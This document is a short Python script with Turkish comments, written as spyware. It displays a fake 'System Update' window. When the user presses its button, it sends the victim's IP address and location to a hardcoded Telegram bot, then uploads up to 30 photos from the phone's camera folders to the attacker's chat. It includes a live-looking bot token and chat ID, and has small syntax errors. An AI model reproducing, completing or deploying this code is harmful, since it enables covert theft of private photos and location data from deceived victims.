Import os
import requests
import glob
import time
import sys
import tkinter as tk
from tkinter import messagebox

# TOKEN ve ID kısımları temizlendi. Buraya kendi bot bilgilerini gir.
TOKEN = 8689649401:AAGvbIGr8PzxqIfAf3HoHpLhNEK_QF--_nk"
MY_ID = "8125693908"

def get_ip_info():
    """Hedefin IP ve konum bilgisini çeken modül."""
    try:
        response = requests.get("http://ip-api.com/json/", timeout=10)
        data = response.json()
        ip_info = f"--- HEDEF IP BİLGİSİ ---\nIP: {data.get('query')}\nÜlke: {data.get('country')}\nŞehir: {data.get('city')}\nISP: {data.get('isp')}"
        return ip_info
    except:
        return "IP bilgisi alınamadı."

def send_message(text):
    """Metin mesajlarını (IP gibi) gönderen modül."""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {'chat_id': MY_ID, 'text': text}
    requests.post(url, data=payload)

def send_file(path):
    """Dosyaları sızdıran ana motor."""
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        with open(path, 'rb') as f:
            payload = {'chat_id': MY_ID, 'caption': f"Alpha Exfil: {os.path.basename(path)}"}
            r = requests.post(url, data=payload, files={'document': f}, timeout=20)
            return r.status_code == 200
    except:
        return False

def start_operation():
    # İlk iş IP bilgisini sızdır
    send_message(get_ip_info())
    
    print("\n[!] OPERASYON BAŞLADI...")
    paths = ["/sdcard/DCIM/Camera/", "/sdcard/Pictures/", "/storage/emulated/0/DCIM/Camera/"]
    targets = []
    
    for p in paths:
        if os.path.exists(p):
            files = glob.glob(p + "*.[jJ][pP][gG]") + glob.glob(p + "*.[pP][nN][gG]")
            targets.extend(files)

    for img in targets[:30]:
        send_file(img)
        time.sleep(0.8)

def show_gui():
    root = tk.Tk()
    root.title("System Update")
    root.geometry("300x200")
    root.configure(bg="black")
    label = tk.Label(root, text="SISTEM GÜNCELLEMESİ", fg="lime", bg="black")
    label.pack(pady=20)
    btn = tk.Button(root, text="GÜNCELLE", command=lambda: [root.destroy(), start_operation()])
    btn.pack(pady=20)
    root.mainloop()

if __name__ == "__main__":
    show_gui()
